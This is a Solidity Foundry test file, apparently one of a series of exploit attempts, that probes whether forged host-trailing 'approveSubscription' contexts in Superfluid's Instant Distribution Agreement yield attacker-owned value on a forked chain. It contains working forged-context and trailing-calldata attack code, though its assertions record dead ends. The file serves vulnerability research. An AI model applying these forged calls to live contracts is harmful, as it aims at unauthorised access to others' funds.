// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);
}

interface IMATICxLike {
    function upgradeByETH() external payable;
    function balanceOf(address account) external view returns (uint256);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(address token, uint32 indexId, bytes calldata ctx) external returns (bytes memory newCtx);

    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function approveSubscription(
        address token,
        address publisher,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function distribute(
        address token,
        uint32 indexId,
        uint256 amount,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getSubscription(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

/// @title Attempt35
/// @notice Comprehensive PoC for the surviving host-trailing
///         `approveSubscription` primitive on the current ch5 fork head.
/// @dev Hypothesis under test: forged host-trailing `approveSubscription(...)`
///      might
///      be upgradable into attacker-owned units or pending value through:
///      1. fresh approval on a rich live publisher index,
///      2. repeated approvals,
///      3. weird ctx callType/appLevel/appCredit variants,
///      4. publisher-preseeded subscriptions, and
///      5. a follow-up `claim()` after the zero-unit foothold exists.
///
///      Expected dead-end behavior:
///      - a fresh forged host-trailing approve creates
///        `approved=true, units=0, pending=0`,
///      - repeats and ctx variants never mint units or pending,
///      - forged approve only materializes value if the publisher had already
///        assigned real units to the attacker,
///      - `claim()` does not turn a zero-unit approved record into value.
contract Attempt35 is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant HOST_ADDR = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address internal constant IDA_ADDR = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;

    address internal constant DAIX = 0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2;
    address internal constant RIC = 0x263026E7e53DBFDce5ae55Ade22493f828922965;
    address internal constant MATICX_ADDR = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;

    address internal constant LIVE_RICH_PUBLISHER = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;

    uint32 internal constant LIVE_DAIX_INDEX_ID = 0;
    uint32 internal constant LIVE_MATICX_INDEX_ID = 1;
    uint32 internal constant LIVE_RIC_INDEX_ID_2 = 2;
    uint32 internal constant LIVE_RIC_INDEX_ID_3 = 3;

    uint32 internal constant LOCAL_SEEDED_INDEX_ID = 35_001;

    uint128 internal constant SEEDED_UNITS = 100;
    uint256 internal constant SEEDED_DISTRIBUTION = 2 ether;
    uint256 internal constant SEEDED_WRAP_AMOUNT = 5 ether;

    ISuperfluidHost internal constant HOST = ISuperfluidHost(HOST_ADDR);
    IInstantDistributionAgreementV1 internal constant IDA = IInstantDistributionAgreementV1(IDA_ADDR);
    IMATICxLike internal constant MATICX = IMATICxLike(MATICX_ADDR);

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));

        vm.label(ATTACKER, "Attacker");
        vm.label(HOST_ADDR, "SuperfluidHost");
        vm.label(IDA_ADDR, "IDA");
        vm.label(DAIX, "DAIx");
        vm.label(RIC, "RIC");
        vm.label(MATICX_ADDR, "MATICx");
        vm.label(USDCX, "USDCx");
        vm.label(LIVE_RICH_PUBLISHER, "LiveRichPublisher");
    }

    function test_host_trailing_forged_approve_on_live_rex_index_creates_zero_unit_attacker_record() public {
        (bool existBefore, bool approvedBefore, uint128 unitsBefore, uint256 pendingBefore) =
            IDA.getSubscription(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, ATTACKER);
        uint256 attackerBalanceBefore = MATICX.balanceOf(ATTACKER);

        bytes memory ctx = _buildContext(
            ATTACKER, IDA.approveSubscription.selector, 0, ContextUtils.CALL_TYPE_AGREEMENT, 0, 0, address(0), address(0)
        );

        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) =
            _hostTrailingApprove(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, ctx);

        (bool existAfter, bool approvedAfter, uint128 unitsAfter, uint256 pendingAfter) =
            IDA.getSubscription(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, ATTACKER);
        uint256 attackerBalanceAfter = MATICX.balanceOf(ATTACKER);

        console.log("[live forged approve] ok:", ok);
        console.log("[live forged approve] revert:", _decodeRevert(ret));
        console.log("[live forged approve] pre exist/approved:", existBefore, approvedBefore);
        console.log("[live forged approve] pre units/pending:", uint256(unitsBefore), pendingBefore);
        console.log("[live forged approve] post exist/approved:", existAfter, approvedAfter);
        console.log("[live forged approve] post units/pending:", uint256(unitsAfter), pendingAfter);
        console.log("[live forged approve] attacker MATICx delta:", attackerBalanceAfter - attackerBalanceBefore);

        assertFalse(existBefore, "attacker should not start with a live MATICx subscription on the rich publisher");
        assertFalse(approvedBefore, "attacker should not start approved");
        assertEq(unitsBefore, 0, "attacker should not start with units");
        assertEq(pendingBefore, 0, "attacker should not start with pending value");

        assertTrue(ok, "host-trailing forged approve unexpectedly failed on the live rich publisher");
        assertTrue(existAfter, "forged approve should create the attacker subscription record");
        assertTrue(approvedAfter, "forged approve should mark the attacker subscription approved");
        assertEq(unitsAfter, 0, "fresh forged approve should not mint units");
        assertEq(pendingAfter, 0, "fresh forged approve should not create pending value");
        assertEq(attackerBalanceAfter, attackerBalanceBefore, "fresh forged approve should not credit attacker balance");
    }

    function test_live_rich_publisher_has_no_existing_attacker_seed_on_known_indices() public view {
        _assertNoLiveAttackerSeed(DAIX, LIVE_DAIX_INDEX_ID, "DAIx#0");
        _assertNoLiveAttackerSeed(MATICX_ADDR, LIVE_MATICX_INDEX_ID, "MATICx#1");
        _assertNoLiveAttackerSeed(RIC, LIVE_RIC_INDEX_ID_2, "RIC#2");
        _assertNoLiveAttackerSeed(RIC, LIVE_RIC_INDEX_ID_3, "RIC#3");
    }

    function test_repeated_and_ctx_variant_forged_approve_never_escape_zero_units() public {
        bytes memory setupCtx = _buildContext(
            ATTACKER,
            IDA.approveSubscription.selector,
            0,
            ContextUtils.CALL_TYPE_AGREEMENT,
            0,
            0,
            address(0),
            address(0)
        );

        vm.prank(ATTACKER);
        (bool firstOk, bytes memory firstRet) =
            _hostTrailingApprove(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, setupCtx);
        console.log("[repeat baseline] setup ok:", firstOk);
        console.log("[repeat baseline] setup revert:", _decodeRevert(firstRet));
        assertTrue(firstOk, "repeat baseline setup approve unexpectedly failed");
        _assertZeroUnitFootprint(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, ATTACKER, true);

        address thirdParty = makeAddr("attempt35_third_party");
        bytes memory thirdPartyCtx = _buildContext(
            thirdParty,
            IDA.approveSubscription.selector,
            0,
            ContextUtils.CALL_TYPE_AGREEMENT,
            0,
            0,
            address(0),
            address(0)
        );

        vm.prank(ATTACKER);
        (bool thirdOk, bytes memory thirdRet) =
            _hostTrailingApprove(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, thirdPartyCtx);

        (bool thirdExist, bool thirdApproved, uint128 thirdUnits, uint256 thirdPending) =
            IDA.getSubscription(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, thirdParty);

        console.log("[repeat baseline] third-party ok:", thirdOk);
        console.log("[repeat baseline] third-party revert:", _decodeRevert(thirdRet));
        console.log("[repeat baseline] third-party post exist/approved:", thirdExist, thirdApproved);
        console.log("[repeat baseline] third-party post units/pending:", uint256(thirdUnits), thirdPending);

        assertFalse(thirdOk, "fresh third-party forged approve should stay closed");
        assertEq(_decodeRevert(thirdRet), "invalid ctx", "fresh third-party forged approve changed revert");
        assertFalse(thirdExist, "third-party forged approve must not create a record");
        assertEq(thirdUnits, 0, "third-party forged approve must not mint units");
        assertEq(thirdPending, 0, "third-party forged approve must not create pending");

        uint256 repeatBalanceBefore = MATICX.balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        (bool secondOk, bytes memory secondRet) =
            _hostTrailingApprove(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, setupCtx);

        (bool repeatExist, bool repeatApproved, uint128 repeatUnits, uint256 repeatPending) =
            IDA.getSubscription(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, ATTACKER);
        uint256 repeatBalanceAfter = MATICX.balanceOf(ATTACKER);

        console.log("[repeat baseline] second ok:", secondOk);
        console.log("[repeat baseline] second revert:", _decodeRevert(secondRet));
        console.log("[repeat baseline] post exist/approved:", repeatExist, repeatApproved);
        console.log("[repeat baseline] post units/pending:", uint256(repeatUnits), repeatPending);
        console.log("[repeat baseline] attacker balance delta:", repeatBalanceAfter - repeatBalanceBefore);

        assertEq(repeatUnits, 0, "repeated approve must not mint units");
        assertEq(repeatPending, 0, "repeated approve must not create pending");
        assertEq(repeatBalanceAfter, repeatBalanceBefore, "repeated approve must not credit balance");
        assertTrue(repeatExist, "repeated approve must preserve the attacker record");
        assertTrue(repeatApproved, "repeated approve must preserve approval");

        _exerciseVariant(
            "variant appAction",
            _buildContext(
                ATTACKER,
                IDA.approveSubscription.selector,
                0,
                ContextUtils.CALL_TYPE_APP_ACTION,
                0,
                0,
                address(0),
                address(0)
            )
        );

        _exerciseVariant(
            "variant appCallback",
            _buildContext(
                ATTACKER,
                IDA.approveSubscription.selector,
                1,
                ContextUtils.CALL_TYPE_APP_CALLBACK,
                0,
                0,
                address(0),
                address(0)
            )
        );

        _exerciseVariant(
            "variant maxCredit",
            _buildContext(
                ATTACKER,
                IDA.approveSubscription.selector,
                7,
                ContextUtils.CALL_TYPE_AGREEMENT,
                type(uint128).max,
                -1,
                ATTACKER,
                USDCX
            )
        );
    }

    function test_host_trailing_forged_approve_only_materializes_existing_publisher_seeded_units() public {
        address seededPublisher = makeAddr("attempt35_seeded_publisher");
        vm.label(seededPublisher, "Attempt35SeededPublisher");

        _seedPendingSubscription(LOCAL_SEEDED_INDEX_ID, seededPublisher, ATTACKER, SEEDED_UNITS, SEEDED_DISTRIBUTION);

        (bool existBefore, bool approvedBefore, uint128 unitsBefore, uint256 pendingBefore) =
            IDA.getSubscription(MATICX_ADDR, seededPublisher, LOCAL_SEEDED_INDEX_ID, ATTACKER);
        uint256 attackerBalanceBefore = MATICX.balanceOf(ATTACKER);

        bytes memory ctx = _buildContext(
            ATTACKER, IDA.approveSubscription.selector, 0, ContextUtils.CALL_TYPE_AGREEMENT, 0, 0, address(0), address(0)
        );

        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) = _hostTrailingApprove(MATICX_ADDR, seededPublisher, LOCAL_SEEDED_INDEX_ID, ctx);

        (bool existAfter, bool approvedAfter, uint128 unitsAfter, uint256 pendingAfter) =
            IDA.getSubscription(MATICX_ADDR, seededPublisher, LOCAL_SEEDED_INDEX_ID, ATTACKER);
        uint256 attackerBalanceAfter = MATICX.balanceOf(ATTACKER);

        console.log("[seeded approve] ok:", ok);
        console.log("[seeded approve] revert:", _decodeRevert(ret));
        console.log("[seeded approve] pre exist/approved:", existBefore, approvedBefore);
        console.log("[seeded approve] pre units/pending:", uint256(unitsBefore), pendingBefore);
        console.log("[seeded approve] post exist/approved:", existAfter, approvedAfter);
        console.log("[seeded approve] post units/pending:", uint256(unitsAfter), pendingAfter);
        console.log("[seeded approve] attacker MATICx delta:", attackerBalanceAfter - attackerBalanceBefore);

        assertTrue(ok, "host-trailing forged approve on a seeded attacker subscription should succeed");
        assertTrue(existBefore, "seeded subscription should exist before approve");
        assertFalse(approvedBefore, "seeded subscription must start unapproved");
        assertEq(unitsBefore, SEEDED_UNITS, "publisher-seeded units mismatch");
        assertEq(pendingBefore, SEEDED_DISTRIBUTION, "publisher-seeded pending mismatch");

        assertTrue(existAfter, "approve should preserve the seeded record");
        assertTrue(approvedAfter, "approve should flip the seeded record to approved");
        assertEq(unitsAfter, SEEDED_UNITS, "approve should preserve existing units rather than mint new ones");
        assertEq(pendingAfter, 0, "approve should clear the existing pending amount");
        assertEq(
            attackerBalanceAfter - attackerBalanceBefore,
            SEEDED_DISTRIBUTION,
            "approve should only materialize the publisher-seeded pending amount"
        );
    }

    function test_claim_after_zero_unit_forged_approve_is_a_state_dead_end() public {
        bytes memory approveCtx = _buildContext(
            ATTACKER, IDA.approveSubscription.selector, 0, ContextUtils.CALL_TYPE_AGREEMENT, 0, 0, address(0), address(0)
        );

        vm.prank(ATTACKER);
        (bool approveOk,) = _hostTrailingApprove(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, approveCtx);
        assertTrue(approveOk, "setup forged approve unexpectedly failed");

        uint256 attackerBalanceBefore = MATICX.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        (bool claimOk, bytes memory claimRet) = _hostCallRaw(
            abi.encodeCall(IDA.claim, (MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, ATTACKER, new bytes(0)))
        );

        (bool existAfter, bool approvedAfter, uint128 unitsAfter, uint256 pendingAfter) =
            IDA.getSubscription(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, ATTACKER);
        uint256 attackerBalanceAfter = MATICX.balanceOf(ATTACKER);

        console.log("[claim after zero-unit approve] ok:", claimOk);
        console.log("[claim after zero-unit approve] revert:", _decodeRevert(claimRet));
        console.log("[claim after zero-unit approve] post exist/approved:", existAfter, approvedAfter);
        console.log("[claim after zero-unit approve] post units/pending:", uint256(unitsAfter), pendingAfter);
        console.log("[claim after zero-unit approve] attacker MATICx delta:", attackerBalanceAfter - attackerBalanceBefore);

        assertTrue(existAfter, "zero-unit attacker record should remain present");
        assertTrue(approvedAfter, "zero-unit attacker record should remain approved");
        assertEq(unitsAfter, 0, "claim must not mint units onto the zero-unit record");
        assertEq(pendingAfter, 0, "claim must not create pending on the zero-unit record");
        assertEq(attackerBalanceAfter, attackerBalanceBefore, "claim must not credit attacker balance");
    }

    function _exerciseVariant(string memory label, bytes memory ctx) internal {
        uint256 balanceBefore = MATICX.balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) = _hostTrailingApprove(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, ctx);

        (bool existAfter, bool approvedAfter, uint128 unitsAfter, uint256 pendingAfter) =
            IDA.getSubscription(MATICX_ADDR, LIVE_RICH_PUBLISHER, LIVE_MATICX_INDEX_ID, ATTACKER);
        uint256 balanceAfter = MATICX.balanceOf(ATTACKER);

        console.log(label);
        console.log("  ok:", ok);
        console.log("  revert:", _decodeRevert(ret));
        console.log("  post exist/approved:", existAfter, approvedAfter);
        console.log("  post units/pending:", uint256(unitsAfter), pendingAfter);
        console.log("  balance delta:", balanceAfter - balanceBefore);

        assertTrue(existAfter, "ctx variant must preserve the attacker record");
        assertTrue(approvedAfter, "ctx variant must preserve approval");
        assertEq(unitsAfter, 0, "ctx variant must not mint units");
        assertEq(pendingAfter, 0, "ctx variant must not create pending");
        assertEq(balanceAfter, balanceBefore, "ctx variant must not credit the subscriber");
    }

    function _assertNoLiveAttackerSeed(address token, uint32 indexId, string memory label) internal view {
        (bool exist, bool approved, uint128 units, uint256 pending) =
            IDA.getSubscription(token, LIVE_RICH_PUBLISHER, indexId, ATTACKER);

        console.log(label);
        console.log("  exist/approved:", exist, approved);
        console.log("  units/pending:", uint256(units), pending);

        assertEq(units, 0, "attacker should not already have units on the live rich publisher");
        assertEq(pending, 0, "attacker should not already have pending value on the live rich publisher");
    }

    function _assertZeroUnitFootprint(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bool expectExist
    ) internal view {
        (bool exist, bool approved, uint128 units, uint256 pending) = IDA.getSubscription(token, publisher, indexId, subscriber);

        assertEq(exist, expectExist, "unexpected subscription existence");
        if (expectExist) {
            assertTrue(approved, "expected the subscription to be approved");
        }
        assertEq(units, 0, "zero-unit footprint expected");
        assertEq(pending, 0, "zero-pending footprint expected");
    }

    function _seedPendingSubscription(
        uint32 indexId,
        address publisher,
        address subscriber,
        uint128 units,
        uint256 distributionAmount
    ) internal {
        vm.deal(publisher, 10 ether);

        vm.prank(publisher);
        MATICX.upgradeByETH{value: SEEDED_WRAP_AMOUNT}();

        vm.startPrank(publisher);
        _hostCall(abi.encodeCall(IDA.createIndex, (MATICX_ADDR, indexId, new bytes(0))));
        _hostCall(abi.encodeCall(IDA.updateSubscription, (MATICX_ADDR, indexId, subscriber, units, new bytes(0))));
        _hostCall(abi.encodeCall(IDA.distribute, (MATICX_ADDR, indexId, distributionAmount, new bytes(0))));
        vm.stopPrank();
    }

    function _hostCall(bytes memory callData) internal {
        HOST.callAgreement(IDA, callData, new bytes(0));
    }

    function _hostCallRaw(bytes memory callData) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, callData, new bytes(0))));
    }

    function _hostTrailingApprove(
        address token,
        address publisher,
        uint32 indexId,
        bytes memory ctx
    ) internal returns (bool ok, bytes memory ret) {
        bytes memory inner = abi.encodeCall(IDA.approveSubscription, (token, publisher, indexId, ctx));
        return _hostCallRaw(abi.encodePacked(inner, abi.encode(new bytes(0))));
    }

    function _buildContext(
        address fakeMsgSender,
        bytes4 selector,
        uint8 appLevel,
        uint8 callType,
        uint256 appCreditGranted,
        int256 appCreditUsed,
        address appAddress,
        address appCreditToken
    ) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(fakeMsgSender, selector, "");
        ctx.appCallbackLevel = appLevel;
        ctx.callType = callType;
        ctx.appCreditGranted = appCreditGranted;
        ctx.appCreditUsed = appCreditUsed;
        ctx.appAddress = appAddress;
        ctx.appCreditToken = appCreditToken;
        return ContextUtils.encodeContext(ctx);
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) return "<empty>";
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 0x04)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "<custom/unknown>";
    }
}
